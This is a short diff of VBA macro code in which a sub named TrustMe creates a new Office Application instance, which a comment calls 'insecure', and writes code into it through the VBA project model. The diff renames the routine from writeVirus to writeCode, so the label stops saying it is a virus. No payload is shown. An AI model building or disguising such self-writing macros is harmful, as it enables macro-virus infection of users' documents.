@@ -7,7 +7,7 @@ Sub TrustMe()
     'Create the insecure application
     Set insecureApplication = New Application
     'Write the virus in the insecure application
-    Call writeVirus(insecureApplication)
+    Call writeCode(insecureApplication)
     
 End Sub
 
@@ -36,7 +36,7 @@ End Sub
 
 
 
-Private Sub writeVirus(insecureApplication As Application)
+    Private Sub writeCode(insecureApplication As Application)
     'Going to set vbProj
     Dim vbProj As Object
     Dim vbComp As Object
